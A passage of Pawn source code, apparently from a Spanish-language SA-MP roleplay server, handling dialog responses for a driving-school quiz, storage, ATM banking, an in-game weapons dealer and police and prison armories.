  	    if(!response){TemaAutoescuelaCond(playerid, 2); return 1;}
  	    TemaAutoescuelaCond(playerid, 4);
  	}
  	if(dialogid == 11) //Autoescuela conducción tema 4
  	{
  	    if(!response){TemaAutoescuelaCond(playerid, 3); return 1;}
  	    TemaAutoescuelaCond(playerid, 5);
  	}
  	if(dialogid == 12) //Autoescuela conducción tema 5
  	{
  	    if(!response){TemaAutoescuelaCond(playerid, 4); return 1;}
  	    TemaAutoescuelaCond(playerid, 6);
  	}
  	if(dialogid == 13) //Autoescuela conducción tema 6
  	{
  	    if(!response){TemaAutoescuelaCond(playerid, 5); return 1;}
  	    TemaAutoescuelaCond(playerid, 7);
  	}
  	if(dialogid == 14) //Autoescuela conducción tema 7
  	{
  	    if(!response){TemaAutoescuelaCond(playerid, 6); return 1;}
  	    PreguntaAutoescuelaCond(playerid, 0);
  	}
  	if(dialogid == 15) //Autoescuela conducción pregunta 1
  	{
  	    if(inputtext[0] == '4'){GameTextForPlayer(playerid, "~g~Correcto", 1000, 6); PreguntaAutoescuelaCond(playerid, 1); return 1;}
        GameTextForPlayer(playerid, "~r~Suspenso", 1000, 6);
        SendClientMessage(playerid, Rojo, "Fallaste el test.");
		SendClientMessage(playerid, Rojo, "Se te descuentan 100$ por la plaza.");
        GivePlayerMoneyAC(playerid, -100);
        TogglePlayerControllable(playerid, 1);
        EnAutoEscuela[playerid] = 0;
  	}
  	if(dialogid == 16) //Autoescuela conducción pregunta 2
  	{
  	    if(inputtext[0] == '2'){GameTextForPlayer(playerid, "~g~Correcto", 1000, 6); PreguntaAutoescuelaCond(playerid, 2); return 1;}
  	    GameTextForPlayer(playerid, "~r~Suspenso", 1000, 6);
  	    SendClientMessage(playerid, Rojo, "Fallaste el test.");
		SendClientMessage(playerid, Rojo, "Se te descuentan 100$ por la plaza.");
        GivePlayerMoneyAC(playerid, -100);
        TogglePlayerControllable(playerid, 1);
        EnAutoEscuela[playerid] = 0;
  	}
  	if(dialogid == 17) //Autoescuela conducción pregunta 3
  	{
  	    if(inputtext[0] == '2'){GameTextForPlayer(playerid, "~g~Correcto", 1000, 6); PreguntaAutoescuelaCond(playerid, 3); return 1;}
  	    GameTextForPlayer(playerid, "~r~Suspenso", 1000, 6);
  	    SendClientMessage(playerid, Rojo, "Fallaste el test.");
		SendClientMessage(playerid, Rojo, "Se te descuentan 100$ por la plaza.");
        GivePlayerMoneyAC(playerid, -100);
        TogglePlayerControllable(playerid, 1);
        EnAutoEscuela[playerid] = 0;
  	}
  	if(dialogid == 18) //Autoescuela conducción pregunta 4
  	{
  	    if(inputtext[0] == '3'){GameTextForPlayer(playerid, "~g~Correcto", 1000, 6); PreguntaAutoescuelaCond(playerid, 4); return 1;}
  	    GameTextForPlayer(playerid, "~r~Suspenso", 1000, 6);
  	    SendClientMessage(playerid, Rojo, "Fallaste el test.");
		SendClientMessage(playerid, Rojo, "Se te descuentan 100$ por la plaza.");
        GivePlayerMoneyAC(playerid, -100);
        TogglePlayerControllable(playerid, 1);
        EnAutoEscuela[playerid] = 0;
  	}
  	if(dialogid == 19) //Autoescuela conducción pregunta 5
  	{
  	    if(inputtext[0] == '3')
	  	{
	  		GameTextForPlayer(playerid, "~g~Aprobado", 1000, 6);
	  		TogglePlayerControllable(playerid, 1);
	  		SendClientMessage(playerid, Verde, "Parte teórica aprobada.");
	  		SendClientMessage(playerid, Amarillo, "Tienes 20 segundos para subir a un vehículo de la autoescuela y empezar la parte práctica.");
	  		SetTimerEx("TimerAutoescuela", 20000, false, "i", playerid);
			return 1;
		}
  	    GameTextForPlayer(playerid, "~r~Suspenso", 1000, 6);
  	    SendClientMessage(playerid, Rojo, "Fallaste el test.");
		SendClientMessage(playerid, Rojo, "Se te descuentan 100$ por la plaza.");
        GivePlayerMoneyAC(playerid, -100);
        TogglePlayerControllable(playerid, 1);
        EnAutoEscuela[playerid] = 0;
  	}
  	if(dialogid == 20) //Armarios
  	{
  	    if(!response){return 1;}
  	    new i = listitem;
		if(i == 10){return 1;} //Selecciona la barra separadora
		if(i >= 0 && i <= 9) //Selecciona un slot
		{
			SacarArmario(playerid, GetPlayerDentroCasa(playerid), i);
		}
		if(i == 11) //Selecciona mano derecha
		{
			GuardarArmario(playerid, GetPlayerDentroCasa(playerid), 1);
		}
		if(i == 12) //Selecciona mano izquierda
		{
		    GuardarArmario(playerid, GetPlayerDentroCasa(playerid), 2);
		}
  	}
  	if(dialogid == 21) //Almacén
  	{
  	    if(!response){return 1;}
  	    new i = listitem;
  	    new nego = GetPlayerDentroNego(playerid);
		if(i == NegoInfo[nego][nMaxAlmacen]){return 1;} //Selecciona la barra separadora
		if(i >= 0 && i < NegoInfo[nego][nMaxAlmacen]) //Selecciona un slot
		{
			SacarAlmacen(playerid, nego, i);
		}
		if(i == NegoInfo[nego][nMaxAlmacen]+1) //Selecciona mano derecha
		{
			GuardarAlmacen(playerid, nego, 1);
		}
		if(i == NegoInfo[nego][nMaxAlmacen]+2) //Selecciona mano izquierda
		{
		    GuardarAlmacen(playerid, nego, 2);
		}
  	}
  	if(dialogid == 22) //Agenda (mostrar contactos)
    {
        if(!response){return 1;}
        new i = listitem;
        new Numero = AgendaNumero[playerid][i], Contacto[41];
	    format(Contacto, sizeof(Contacto), "%s", AgendaContacto[playerid][i]);
        if(!strlen(Contacto) || strcmp(Contacto,"NULL",true) == 0)
        {
			SendClientMessage(playerid, Rojo, "* Contacto vacío.");
        }
        else
        {
            LlamarTelefono(playerid, Numero);
        }
    }
    if(dialogid == 23) //Contacto de armas
    {
        if(!response){return 1;}
        new i = listitem, caja, coche = GetPlayerVehicleID(playerid);
        if(GetPlayerMoney(playerid) < PreciosContactoArmas[i]){ProxDetector(15.0, playerid,"Desconocido: Yo no fío a nadie. Si no tienes la pasta no es mi problema.",Chat1,Chat2,Chat3,Chat4,Chat5); return 1;}
        switch(i)
        {
            case 0: caja = 102; //Katana
		    case 1: caja = 103; //M1911
		    case 2: caja = 104; //Cargador M1911
		    case 3: caja = 105; //Balas .45 ACP
		    case 4: caja = 106; //D. Eagle
		    case 5: caja = 107; //Cargador D. Eagle
		    case 6: caja = 108; //Balas .50 AE
		    case 7: caja = 109; //Tec-9
		    case 8: caja = 110; //Cargador Tec-9
		    case 9: caja = 111; //UZI
		    case 10: caja = 112; //Cargador UZI
		    case 11: caja = 113; //MP5
		    case 12: caja = 114; //Cargador MP5
		    case 13: caja = 115; //Balas SMG
		    case 14: caja = 116; //Escopeta
		    case 15: caja = 117; //Escopeta recortada
		    case 16: caja = 118; //Cartuchos 12GA
		    case 17: caja = 119; //Ak-47
		    case 18: caja = 120; //Cargador Ak-47
		    case 19: caja = 121; //Balas Ak-47
		    case 20: caja = 122; //Rifle
		    case 21: caja = 123; //Cargador rifle
		    case 22: caja = 124; //Balas rifle
		}
		for(new x=0; x<CarInfo[GetPlayerVehicleID(playerid)][cMaxMaletero]; x++)
		{
		    if(CarInfo[coche][cMaletero][x] == 0)
		    {
		    	CarInfo[coche][cMaletero][x] = caja;
		    	CarInfo[coche][cMaleteroCant][x] = ObjetoInfo[caja][Capacidad];
		    	break;
		    }
		}
		GivePlayerMoneyAC(playerid, -PreciosContactoArmas[i]);
		new string[128];
		format(string, sizeof(string), "Desconocido: Una %s... Te costará %d$, no te arrepentirás.", ObjetoInfo[caja][NombreObjeto], PreciosContactoArmas[i]);
		ProxDetector(15.0, playerid,string,Chat1,Chat2,Chat3,Chat4,Chat5);
		if(AvisoLSPDCompraArmas <= 0)
		{
		    SendRadioMessage(1, AguamarinaOscuro, "[Radio] Central: Hay rumores de que intentan introducir un cargamento de armas en la ciudad.");
		    AvisoLSPDCompraArmas = 15;
		}
		SetTimerEx("AsignarTiempoCompraMafias", 600000, false, "d, d", PlayerInfo[playerid][pFaccion], 1);
    }
    if(dialogid == 24) //Menú ATM
    {
        if(!response){return 1;}
        switch(listitem)
        {
            case 0: MostrarATM(playerid, 2);
            case 1: MostrarATM(playerid, 3);
            case 2: MostrarATM(playerid, 4);
            case 3: MostrarATM(playerid, 6);
        }
    }
    if(dialogid == 25) //Retirar dinero ATM
    {
        if(!response){MostrarATM(playerid, 1); return 1;}
        new string[128];
        new dinero = strval(inputtext[0]);
		if(dinero < 1){SendClientMessage(playerid, Rojo, "* La cantidad no puede menor que 1$."); MostrarATM(playerid, 1); return 1;}
		if(dinero > PlayerInfo[playerid][pDineroBanco]){SendClientMessage(playerid, Rojo, "* No tienes tanto dinero en tu cuenta bancaria."); MostrarATM(playerid, 1); return 1;}
		GivePlayerMoneyAC(playerid, dinero);
		PlayerInfo[playerid][pDineroBanco] -= dinero;
		format(string, sizeof(string), "Has retirado %d$ de tu cuenta bancaria.", dinero);
		SendClientMessage(playerid, Amarillo, string);
		format(string, sizeof(string), "* %s realiza una acción en el cajero.", GetPlayerNameRP(playerid));
	    ProxDetector(5.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
	    MostrarATM(playerid, 1);
    }
    if(dialogid == 26) //Ingresar dinero ATM
    {
        if(!response){MostrarATM(playerid, 1); return 1;}
        new string[128];
        new dinero = strval(inputtext[0]);
		if(dinero < 1){SendClientMessage(playerid, Rojo, "* La cantidad no puede menor que 1$."); MostrarATM(playerid, 1); return 1;}
		if(dinero > GetPlayerMoney(playerid)){SendClientMessage(playerid, Rojo, "* No tienes tanto dinero en mano."); MostrarATM(playerid, 1); return 1;}
		GivePlayerMoneyAC(playerid, -dinero);
		PlayerInfo[playerid][pDineroBanco] += dinero;
		format(string, sizeof(string), "Has depositado %d$ en tu cuenta bancaria.", dinero);
		SendClientMessage(playerid, Amarillo, string);
		format(string, sizeof(string), "* %s realiza una acción en el cajero.", GetPlayerNameRP(playerid));
	    ProxDetector(5.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
	    MostrarATM(playerid, 1);
    }
    if(dialogid == 27) //Transferir dinero ATM (ID)
    {
        if(!response){MostrarATM(playerid, 1); return 1;}
        if(PlayerInfo[playerid][pNivel] < 3){SendClientMessage(playerid, Rojo, "* Necesitas al menos ser nivel 3."); MostrarATM(playerid, 1); return 1;}
		TransferirPlayer[playerid] = ReturnUser(inputtext[0]);
		if(TransferirPlayer[playerid] == playerid){SendClientMessage(playerid, Rojo, "* No te puedes transferir dinero a tí mismo."); MostrarATM(playerid, 1); return 1;}
		if(!IsPlayerConnected(TransferirPlayer[playerid]) || TransferirPlayer[playerid] == INVALID_PLAYER_ID){SendClientMessage(playerid, Rojo, "* ID inválida."); MostrarATM(playerid, 1); return 1;}
		if(PlayerInfo[TransferirPlayer[playerid]][pNivel] < 3){SendClientMessage(playerid, Rojo, "* El receptor necesita al menos ser nivel 3."); MostrarATM(playerid, 1); return 1;}
		MostrarATM(playerid, 5);
    }
    if(dialogid == 28) //Transferir dinero ATM (Cantidad)
    {
        new string[128];
        if(!response){MostrarATM(playerid, 1); return 1;}
        new dinero = strval(inputtext[0]);
	    if(dinero < 1){SendClientMessage(playerid, Rojo, "* La cantidad no puede ser menor que 1$."); MostrarATM(playerid, 1); return 1;}
		if(PlayerInfo[playerid][pDineroBanco] < dinero){SendClientMessage(playerid, Rojo, "* No tienes tanto dinero en tu cuenta bancaria."); MostrarATM(playerid, 1); return 1;}
		if(dinero > 100000){SendClientMessage(playerid, Rojo, "* Solo puedes transferir un máximo de 100.000$."); MostrarATM(playerid, 1); return 1;}
		PlayerInfo[playerid][pDineroBanco] -= dinero;
		PlayerInfo[TransferirPlayer[playerid]][pDineroBanco] += dinero;
		format(string, sizeof(string), "Has transferido %d$ a la cuenta de %s [ID: %d].", dinero, GetPlayerNameRP(TransferirPlayer[playerid]), TransferirPlayer[playerid]);
		SendClientMessage(playerid, Amarillo, string);
		format(string, sizeof(string), "Has recibido una transferencia de %d$ de %s [ID: %d].", dinero, GetPlayerNameRP(playerid), playerid);
		SendClientMessage(TransferirPlayer[playerid], Amarillo, string);
	    format(string, sizeof(string), "%s ha transferido %d$ a %s", GetPlayerNameRP(playerid), dinero, GetPlayerNameRP(TransferirPlayer[playerid]));
		SendAdminMessage(Aguamarina, string);
		PlayerPlaySound(TransferirPlayer[playerid], 1052, 0.0, 0.0, 0.0);
	    printf("%s", string);
	    format(string, sizeof(string), "* %s realiza una acción en el cajero.", GetPlayerNameRP(playerid));
	    ProxDetector(5.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
	    MostrarATM(playerid, 1);
    }
    if(dialogid == 29) //Balance ATM
    {
        MostrarATM(playerid, 1);
    }
    if(dialogid == 30) //Anti afk
    {
		EstaAFK[playerid] = 0;
		AntiAFKPos[playerid][3] = 0;
		AntiAFKPos[playerid][4] = 0;
		AntiAFKPos[playerid][5] = 0;
    }
    if(dialogid == 31) //Vestuario prisión federal
    {
        if(!response){return 1;}
    	new string[128];
    	switch(listitem)
    	{
    		case 0: //Carcelario
    		{
				SetPlayerSkin(playerid, 282);
				format(string, sizeof(string), "* %s coge el uniforme de carcelario.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				PlayerInfo[playerid][pServicioPD] = 13;
				return 1;
    		}
    		case 1: //Ropa normal
    		{
    			if(PlayerInfo[playerid][pManoDer] > 0 || PlayerInfo[playerid][pManoIzq] > 0 || PlayerInfo[playerid][pEspalda] > 0){SendClientMessage(playerid, Rojo, "* Devuelve antes tus armas."); return 1;}
    			if(!(GetPlayerSkin(playerid) == 288 || GetPlayerSkin(playerid) == 285 || GetPlayerSkin(playerid) == 284 || GetPlayerSkin(playerid) == 280 || GetPlayerSkin(playerid) == 71 || GetPlayerSkin(playerid) == 282 || PlayerInfo[playerid][pServicioPD] > 0)){SendClientMessage(playerid, Rojo, "* No estás de servicio."); return 1;}
    			for(new x = 0; x < 8; x++)
				{
	  				PlayerInfo[playerid][pCint][x] = 0;
	  				PlayerInfo[playerid][pCintCant][x] = 0;
				}
				SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
				format(string, sizeof(string), "* %s coge su ropa y se viste.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				PlayerInfo[playerid][pServicioPD] = 0;
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					if(IsPlayerConnected(i))
					{
						if(PlayerInfo[i][pFaccion] == 1 && SolicitaRefuerzos[i] == 1)
						{
							SetPlayerMarkerForPlayer(playerid, i, Blanco2);
						}
					}
				}
				return 1;
    		}
    	}
    }
    if(dialogid == 32) //Armeria prisión federal
    {
        if(!response){return 1;}
    	new string[128];
    	switch(listitem)
    	{
    		case 0: //Equipo vigilancia 1 (Escopeta)
    		{
    		    if(PlayerInfo[playerid][pRango] < 2){SendClientMessage(playerid, Rojo, "* Rango insuficiente."); return 1;}
    		    if(PlayerInfo[playerid][pServicioPD] != 13){SendClientMessage(playerid, Rojo, "* No estás de servicio como carcelero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] > 0 || PlayerInfo[playerid][pManoIzq] > 0){SendClientMessage(playerid, Rojo, "* Devuelve antes tus armas."); return 1;}
				PlayerInfo[playerid][pCint][0] = 50, PlayerInfo[playerid][pCintCant][0] = 20; //Cargador Escopeta
				PlayerInfo[playerid][pCint][1] = 50, PlayerInfo[playerid][pCintCant][1] = 20; //Cargador Escopeta
				PlayerInfo[playerid][pCint][2] = 3, PlayerInfo[playerid][pCintCant][2] = 1; //Porra
   				PlayerInfo[playerid][pCint][3] = 34, PlayerInfo[playerid][pCintCant][3] = 200; //Spray
				PlayerInfo[playerid][pCint][4] = 38, PlayerInfo[playerid][pCintCant][4] = 1; //Pistola táser
				PlayerInfo[playerid][pEspalda] = 22, PlayerInfo[playerid][pEspaldaCant] = 4; //Escopeta
    			PonerObjeto(playerid, 3, 22);
    			format(string, sizeof(string), "* %s coge el equipo de vigilancia 1.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				return 1;
    		}
    		case 1: //Equipo vigilancia 2 (Rifle)
    		{
    			if(PlayerInfo[playerid][pRango] < 2){SendClientMessage(playerid, Rojo, "* Rango insuficiente."); return 1;}
    			if(PlayerInfo[playerid][pServicioPD] != 13){SendClientMessage(playerid, Rojo, "* No estás de servicio como carcelero."); return 1;}
    			if(PlayerInfo[playerid][pManoDer] > 0 || PlayerInfo[playerid][pManoIzq] > 0){SendClientMessage(playerid, Rojo, "* Devuelve antes tus armas."); return 1;}
    			PlayerInfo[playerid][pCint][0] = 46, PlayerInfo[playerid][pCintCant][0] = 5; //Cargador rifle
				PlayerInfo[playerid][pCint][1] = 46, PlayerInfo[playerid][pCintCant][1] = 5; //Cargador rifle
				PlayerInfo[playerid][pCint][2] = 3, PlayerInfo[playerid][pCintCant][2] = 1; //Porra
   				PlayerInfo[playerid][pCint][3] = 34, PlayerInfo[playerid][pCintCant][3] = 200; //Spray
				PlayerInfo[playerid][pCint][4] = 38, PlayerInfo[playerid][pCintCant][4] = 1; //Pistola táser
				PlayerInfo[playerid][pEspalda] = 30, PlayerInfo[playerid][pEspaldaCant] = 5; //Rifle
    			PonerObjeto(playerid, 3, 30);
				format(string, sizeof(string), "* %s coge el equipo de vigilancia 2.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				return 1;
    		}
    		case 2: //Chaleco
    		{
    		    if(PlayerInfo[playerid][pRango] < 2){SendClientMessage(playerid, Rojo, "* Rango insuficiente."); return 1;}
    		    if(PlayerInfo[playerid][pServicioPD] != 13){SendClientMessage(playerid, Rojo, "* No estás de servicio como carcelero."); return 1;}
				format(string, sizeof(string), "* %s coge un chaleco antibalas y se lo coloca.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				SetPlayerArmour(playerid, 100.0);
				return 1;
    		}
    		case 3: //Devolver armas
    		{
				format(string, sizeof(string), "* %s devuelve sus armas.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				for(new x = 0; x < 8; x++)
				{
				    PlayerInfo[playerid][pCint][x] = 0;
				    PlayerInfo[playerid][pCintCant][x] = 0;
				}
                PlayerInfo[playerid][pManoDer] = 0;
                PlayerInfo[playerid][pManoDerCant] = 0;
                PlayerInfo[playerid][pManoIzq] = 0;
                PlayerInfo[playerid][pManoIzqCant] = 0;
                PlayerInfo[playerid][pEspalda] = 0;
                PlayerInfo[playerid][pEspaldaCant] = 0;
                RemovePlayerAttachedObject(playerid, 1);
                RemovePlayerAttachedObject(playerid, 2);
                RemovePlayerAttachedObject(playerid, 3);
                ResetPlayerWeapons(playerid);
				SetPlayerArmour(playerid, 0.0);
				return 1;
    		}
    	}
    }
    if(dialogid == 33) //Informes LSED
	{
	    if(!response) return 1;
        AtendiendoInforme[playerid] = InformeEmergencias[listitem][ieJugador];
		InformeEmergencias[listitem][ieEstado] = 1;
		SetPlayerCheckpoint(playerid, InformeEmergencias[listitem][ieX], InformeEmergencias[listitem][ieY], InformeEmergencias[listitem][ieZ], 5);
		SendClientMessage(playerid, Amarillo, "* Se ha marcado el lugar de la emergencia en el radar.");
		return 1;
	}
	if(dialogid == 34) //Armería 1 LSPD
	{
	    if(!response){return 1;}
    	new string[128], objeto;
    	switch(listitem)
    	{
    		case 0: //Chaleco antibalas
    		{
    		    format(string, sizeof(string), "* %s coge un chaleco antibalas.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				SetPlayerArmour(playerid, 100);
				return 1;
    		}
			case 1: return 1;
    		case 2: //Porra
    		{
	   			objeto = 3;
    		}
    		case 3: //Spray
    		{
                objeto = 34;
    		}
    		case 4: //Táser
    		{
				objeto = 38;
    		}
            case 5: return 1;
    		case 6: //M1911
    		{
				objeto = 19;
    		}
    		case 7: //Cargador M1911
    		{
				objeto = 39;
    		}
            case 8: return 1;
    		case 9: //DEagle
    		{
                objeto = 21;
    		}
			case 10: //Cargador DEagle
    		{
                objeto = 40;
    		}
            case 11: return 1;
    		case 12: //Escopeta
    		{
                objeto = 22;
    		}
			case 13: //Cartuchos escopeta
    		{
                objeto = 50;
    		}
            case 14: return 1;
    		case 15: //MP5
    		{
                objeto = 26;
    		}
			case 16: //Cargador MP5
    		{
                objeto = 42;
    		}
    		case 17: return 1;
    		case 18: //Armería LSPD lista 2
    		{
                new cadena[450];
				strcat(cadena, "M4A1\n"); //Lista 2
				strcat(cadena, "Cargador M4A1\n");
				strcat(cadena, "|--------------------------------------|\n");
				strcat(cadena, "Remington 700\n");
				strcat(cadena, "Remington 700 + mira\n");
				strcat(cadena, "Cargador Remington 700\n");
				strcat(cadena, "|--------------------------------------|\n");
				strcat(cadena, "Granada lacrimógena\n");
				strcat(cadena, "Granada cegadora\n");
				strcat(cadena, "|--------------------------------------|\n");
				strcat(cadena, "Devolver armas en mano\n");
				strcat(cadena, "Devolver chaleco antibalas\n");
				strcat(cadena, "Devolver todas las armas\n");
				strcat(cadena, "|--------------------------------------|\n");
				strcat(cadena, "<<ANTERIOR");
				ShowPlayerDialog(playerid, 35, 2, "Armería", cadena,"Seleccionar", "Cancelar");
				return 1;
    		}
    	}

    	if(objeto == 3 || objeto == 38 || objeto == 19 || objeto == 21) //Si ya tiene un objeto así en el cint
    	{
			for(new x=0; x<8; x++)
			{
				if(PlayerInfo[playerid][pCint][x] == objeto){SendClientMessage(playerid, Rojo, "* Solo puedes llevar un arma de ese tipo."); return 1;}
			}
		}

		if(objeto == 22 || objeto == 26 || objeto == 28 || objeto == 30 || objeto == 31) //Si ya tiene un arma grande así
		{
		    if(PlayerInfo[playerid][pManoDer] == objeto || PlayerInfo[playerid][pManoIzq] == objeto || PlayerInfo[playerid][pEspalda])
		    {
		        SendClientMessage(playerid, Rojo, "* Ya portas un arma grande de este tipo.");
				return 1;
		    }
		}

		if(objeto == 22 || objeto == 26 || objeto == 28 || objeto == 30 || objeto == 31) //Dar arma grande
		{
		    if(PlayerInfo[playerid][pEspalda] == 0)
		    {
		        PlayerInfo[playerid][pEspalda] = objeto;
				PlayerInfo[playerid][pEspaldaCant] = ObjetoInfo[objeto][Capacidad];
				format(string, sizeof(string), "* %s coge un/a %s de la armería.", GetPlayerNameRP(playerid), ObjetoInfo[objeto][NombreObjeto]);
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				PonerObjeto(playerid, 3, objeto);
				return 1;
		    }
		    else if(PlayerInfo[playerid][pManoDer] == 0)
		    {
		        PlayerInfo[playerid][pManoDer] = objeto;
				PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];
				format(string, sizeof(string), "* %s coge un/a %s de la armería.", GetPlayerNameRP(playerid), ObjetoInfo[objeto][NombreObjeto]);
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				PonerObjeto(playerid, 1, objeto);
				return 1;
		    }
		    else if(PlayerInfo[playerid][pManoIzq] == 0)
		    {
		        PlayerInfo[playerid][pManoIzq] = objeto;
				PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];
				format(string, sizeof(string), "* %s coge un/a %s de la armería.", GetPlayerNameRP(playerid), ObjetoInfo[objeto][NombreObjeto]);
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				PonerObjeto(playerid, 2, objeto);
				return 1;
		    }
		}
		else //Dar otro objeto
		{
			for(new x=0; x<8; x++)
			{
				if(PlayerInfo[playerid][pCint][x] == 0)
				{
				    PlayerInfo[playerid][pCint][x] = objeto;
				    PlayerInfo[playerid][pCintCant][x] = ObjetoInfo[objeto][Capacidad];
				    format(string, sizeof(string), "* %s coge un/a %s de la armería.", GetPlayerNameRP(playerid), ObjetoInfo[objeto][NombreObjeto]);
					ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
					return 1;
				}
			}
		}
	}
	if(dialogid == 35) //Armería 2 LSPD
	{
		if(!response){return 1;}
    	new string[128], objeto;
    	switch(listitem)
    	{
        	case 0: //M4
    		{
                objeto = 28;
    		}
			case 1: //Cargador M4
    		{
                objeto = 45;
    		}
			case 2: return 1;
    		case 3: //Rifle
    		{
                objeto = 30;
    		}
			case 4: //Rifle + mira
    		{
                objeto = 31;
    		}
    		case 5: //Cargador rifle
    		{
                objeto = 46;
    		}
			case 6: return 1;
    		case 7: //Granada lacrimógena
    		{
                objeto = 17;
    		}
    		case 8: //Granada cegadora
    		{
                objeto = 54;
    		}
    		case 9: return 1;
    		case 10: //Devolver armas en mano
    		{
				format(string, sizeof(string), "* %s devuelve las armas de sus manos.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
                PlayerInfo[playerid][pManoDer] = 0;
                PlayerInfo[playerid][pManoDerCant] = 0;
                PlayerInfo[playerid][pManoIzq] = 0;
                PlayerInfo[playerid][pManoIzqCant] = 0;
                RemovePlayerAttachedObject(playerid, 1);
                RemovePlayerAttachedObject(playerid, 2);
                ResetPlayerWeapons(playerid);
				return 1;
    		}
    		case 11: //Devolver chaleco antibalas
    		{
    		    new Float:chaleco;
    		    GetPlayerArmour(playerid, chaleco);
    		    if(chaleco <= 0){SendClientMessage(playerid, Rojo, "* No tienes chaleco antibalas."); return 1;}
				format(string, sizeof(string), "* %s devuelve su chaleco antibalas.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
                SetPlayerArmour(playerid, 0.0);
                ResetPlayerWeapons(playerid);
				return 1;
    		}
			case 12: //Devolver armas
    		{
				format(string, sizeof(string), "* %s devuelve sus armas.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				for(new x = 0; x < 8; x++)
				{
				    PlayerInfo[playerid][pCint][x] = 0;
				    PlayerInfo[playerid][pCintCant][x] = 0;
				}
                PlayerInfo[playerid][pManoDer] = 0;
                PlayerInfo[playerid][pManoDerCant] = 0;
                PlayerInfo[playerid][pManoIzq] = 0;
                PlayerInfo[playerid][pManoIzqCant] = 0;
                PlayerInfo[playerid][pEspalda] = 0;
                PlayerInfo[playerid][pEspaldaCant] = 0;
                RemovePlayerAttachedObject(playerid, 1);
                RemovePlayerAttachedObject(playerid, 2);
                RemovePlayerAttachedObject(playerid, 3);
                ResetPlayerWeapons(playerid);
				SetPlayerArmour(playerid, 0.0);
				return 1;
    		}
    		case 13: return 1;
            case 14: //Armería lista 1
    		{
    		    new cadena[450];
				strcat(cadena, "Chaleco antibalas\n"); //Lista 1
				strcat(cadena, "|--------------------------------------|\n");
				strcat(cadena, "Porra\n");
				strcat(cadena, "Spray\n");
				strcat(cadena, "Táser\n");
				strcat(cadena, "|--------------------------------------|\n");
				strcat(cadena, "M1911\n");
				strcat(cadena, "Cargador M1911\n");
				strcat(cadena, "|--------------------------------------|\n");
				strcat(cadena, "D. Eagle\n");
				strcat(cadena, "Cargador D. Eagle\n");
				strcat(cadena, "|--------------------------------------|\n");
				strcat(cadena, "Winchester 1200\n");
				strcat(cadena, "Cartuchos 12GA\n");
				strcat(cadena, "|--------------------------------------|\n");
				strcat(cadena, "MP5A4\n");
				strcat(cadena, "Cargador MP5A4\n");
				strcat(cadena, "|--------------------------------------|\n");
				strcat(cadena, "SIGUIENTE >>");
				ShowPlayerDialog(playerid, 34, 2, "Armería", cadena,"Seleccionar", "Cancelar");
				return 1;
    		}
		}
		
		if(objeto == 3 || objeto == 38 || objeto == 19 || objeto == 21) //Si ya tiene un objeto así en el cint
    	{
			for(new x=0; x<8; x++)
			{
				if(PlayerInfo[playerid][pCint][x] == objeto){SendClientMessage(playerid, Rojo, "* Solo puedes llevar un arma de ese tipo."); return 1;}
			}
		}

		if(objeto == 22 || objeto == 26 || objeto == 28 || objeto == 30 || objeto == 31) //Si ya tiene un arma grande así
		{
		    if(PlayerInfo[playerid][pManoDer] == objeto || PlayerInfo[playerid][pManoIzq] == objeto || PlayerInfo[playerid][pEspalda])
		    {
		        SendClientMessage(playerid, Rojo, "* Ya portas un arma grande de este tipo.");
				return 1;
		    }
		}

		if(objeto == 22 || objeto == 26 || objeto == 28 || objeto == 30 || objeto == 31) //Dar arma grande
		{
		    if(PlayerInfo[playerid][pEspalda] == 0)
		    {
		        PlayerInfo[playerid][pEspalda] = objeto;
				PlayerInfo[playerid][pEspaldaCant] = ObjetoInfo[objeto][Capacidad];
				format(string, sizeof(string), "* %s coge un/a %s de la armería.", GetPlayerNameRP(playerid), ObjetoInfo[objeto][NombreObjeto]);
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				PonerObjeto(playerid, 3, objeto);
				return 1;
		    }
		    else if(PlayerInfo[playerid][pManoDer] == 0)
		    {
		        PlayerInfo[playerid][pManoDer] = objeto;
				PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];
				format(string, sizeof(string), "* %s coge un/a %s de la armería.", GetPlayerNameRP(playerid), ObjetoInfo[objeto][NombreObjeto]);
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				PonerObjeto(playerid, 1, objeto);
				return 1;
		    }
		    else if(PlayerInfo[playerid][pManoIzq] == 0)
		    {
		        PlayerInfo[playerid][pManoIzq] = objeto;
				PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];
				format(string, sizeof(string), "* %s coge un/a %s de la armería.", GetPlayerNameRP(playerid), ObjetoInfo[objeto][NombreObjeto]);
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				PonerObjeto(playerid, 2, objeto);
				return 1;
		    }
		}
		else //Dar otro objeto
		{
			for(new x=0; x<8; x++)
			{
